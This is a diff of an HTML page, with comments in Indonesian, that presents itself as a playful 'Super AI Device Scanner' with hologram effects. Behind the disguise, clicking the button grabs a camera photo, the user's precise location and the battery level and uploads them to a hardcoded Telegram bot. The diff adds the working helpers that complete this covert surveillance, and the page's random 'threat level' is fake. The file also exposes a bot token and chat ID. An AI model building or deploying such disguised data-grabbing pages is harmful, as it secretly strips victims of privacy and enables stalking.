@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>Super AI Device Scanner</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -9,7 +10,6 @@
       --primary: #2ecc71;
       --secondary: #3498db;
     }
-
     body { 
       font-family: 'Roboto', Arial, sans-serif; 
       text-align: center; 
@@ -20,8 +20,8 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
     }
-
     .scanner-box {
       width: 300px;
       height: 300px;
@@ -32,7 +32,6 @@
       overflow: hidden;
       box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
     }
-
     .scanner-line {
       position: absolute;
       width: 100%;
@@ -41,14 +40,12 @@
       animation: scan 3s infinite;
       box-shadow: 0 0 10px var(--primary);
     }
-
     @keyframes scan {
       0% { top: 0; opacity: 0; }
       10% { opacity: 1; }
       90% { opacity: 1; }
       100% { top: 100%; opacity: 0; }
     }
-
     button {
       padding: 15px 40px;
       font-size: 20px;
@@ -63,20 +60,27 @@
       margin: 20px;
       box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
     }
-
     #loading {
       display: none;
       font-size: 1.5em;
       color: var(--primary);
       text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
+      margin: 10px;
     }
-
     .hologram-effect {
       position: fixed;
       pointer-events: none;
       mix-blend-mode: screen;
       opacity: 0.3;
       z-index: 9999;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+    @keyframes hologram {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -90,12 +94,58 @@
   <div id="loading">🔭 Scanning Quantum Signature...</div>
 
   <script>
+    // === Konfigurasi Bot Telegram ===
     const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
     const CHAT_ID = '1121369247';
+
+    // Variabel global
     let currentStream = null;
     let isScanning = false;
+    const video = document.getElementById('video');
+    const loading = document.getElementById('loading');
 
-    // Hologram Effect
+    // === Fungsi Helper untuk Tampilan ===
+    function showError(title, error) {
+      alert(`${title}: ${error.message || error}`);
+      console.error(title, error);
+    }
+
+    function showToast(message, type) {
+      // Untuk demo, kita gunakan console dan alert
+      console.log(`${type.toUpperCase()}: ${message}`);
+      // Jika ingin menambahkan notifikasi visual, implementasikan sesuai kebutuhan.
+    }
+
+    // === Fungsi Helper untuk Mendapatkan Lokasi ===
+    function getPreciseLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Geolocation not supported"));
+        } else {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        }
+      });
+    }
+
+    // Fungsi Dummy untuk Menganalisis Matriks Perangkat
+    function analyzeDeviceMatrix() {
+      // Kembalikan data dummy; implementasikan analisis yang lebih kompleks bila perlu.
+      return Promise.resolve([[1,0,1],[0,1,0],[1,0,1]]);
+    }
+
+    // Fungsi Dummy untuk Mendapatkan Matriks Gambar
+    function getImageMatrix(canvas) {
+      // Contoh: kembalikan lebar dan tinggi sebagai matriks.
+      return { width: canvas.width, height: canvas.height };
+    }
+
+    // Fungsi untuk Mengubah dataURI menjadi Blob
+    async function dataURItoBlob(dataURI) {
+      const response = await fetch(dataURI);
+      return await response.blob();
+    }
+
+    // === Hologram Effect ===
     function createHologramEffect() {
       const colors = ['#00ffff', '#ff00ff', '#ffff00'];
       const effect = document.createElement('div');
@@ -103,8 +153,8 @@
       
       colors.forEach(color => {
         const layer = document.createElement('div');
-        layer.style = `
-          position: fixed;
+        layer.style.cssText = `
+          position: absolute;
           top: -50%;
           left: -50%;
           width: 200%;
@@ -118,7 +168,7 @@
       document.body.appendChild(effect);
     }
 
-    // Enhanced Camera Initialization
+    // === Inisialisasi Kamera ===
     async function initCamera() {
       try {
         const constraints = {
@@ -131,7 +181,9 @@
           audio: false
         };
 
-        if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+        if (currentStream) {
+          currentStream.getTracks().forEach(track => track.stop());
+        }
 
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         currentStream = stream;
@@ -149,13 +201,14 @@
       }
     }
 
-    // Quantum Scanning Process
+    // === Proses Quantum Scan ===
     async function startQuantumScan() {
       if (isScanning) return;
       isScanning = true;
       loading.style.display = 'block';
 
       try {
+        // Lakukan beberapa proses secara paralel
         const [photoData, location, deviceMatrix, aiAnalysis] = await Promise.all([
           captureQuantumImage(),
           getPreciseLocation(),
@@ -174,7 +227,7 @@
       }
     }
 
-    // Advanced Capture Function
+    // === Fungsi untuk Mengambil Gambar dengan Efek Quantum ===
     async function captureQuantumImage() {
       const canvas = document.createElement('canvas');
       const context = canvas.getContext('2d');
@@ -191,7 +244,7 @@
       };
     }
 
-    // AI-Powered Analysis
+    // === Fungsi Analisis AI (Dummy) ===
     async function performAIAnalysis() {
       const aiData = {
         threatLevel: Math.floor(Math.random() * 100),
@@ -200,14 +253,18 @@
       };
 
       if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        aiData.energySignature = `${Math.round(battery.level * 100)}%`;
+        try {
+          const battery = await navigator.getBattery();
+          aiData.energySignature = `${Math.round(battery.level * 100)}%`;
+        } catch (e) {
+          aiData.energySignature = 'Unknown';
+        }
       }
 
       return aiData;
     }
 
-    // Generate 3D Hologram Report
+    // === Fungsi untuk Menghasilkan Laporan Hologram ===
     function generateHologramReport(photo, location, matrix, ai) {
       const timestamp = new Date().toISOString();
       return {
@@ -226,7 +283,7 @@
       };
     }
 
-    // Enhanced Telegram Integration
+    // === Integrasi dengan Telegram ===
     async function sendToTelegram(report) {
       const formData = new FormData();
       const blob = await dataURItoBlob(report.image);
@@ -249,32 +306,33 @@
         body: formData
       });
 
-      if (!response.ok) throw new Error('Quantum Communication Failed');
+      if (!response.ok) {
+        throw new Error('Quantum Communication Failed');
+      }
     }
 
-    // Quantum Effects
+    // === Efek Filter Quantum pada Gambar ===
     function applyQuantumFilter(ctx, canvas) {
       const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
       const data = imageData.data;
 
       for (let i = 0; i < data.length; i += 4) {
-        data[i] = Math.abs(255 - data[i]);     // Red
-        data[i + 1] = data[i + 1];             // Green 
-        data[i + 2] = Math.abs(255 - data[i + 2]); // Blue
+        // Inversi warna merah dan biru sebagai efek quantum
+        data[i] = 255 - data[i];         // Red
+        // data[i+1] tetap (Green)
+        data[i + 2] = 255 - data[i + 2];   // Blue
       }
 
       ctx.putImageData(imageData, 0, 0);
     }
 
-    // Initialize Quantum Scanner
+    // === Inisialisasi Scanner dan Event Listener ===
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
     } else {
       showToast('Quantum Scanner Not Supported', 'error');
     }
-
-    // ... (Rest of helper functions remain similar with enhancements)
   </script>
 </body>
 </html>
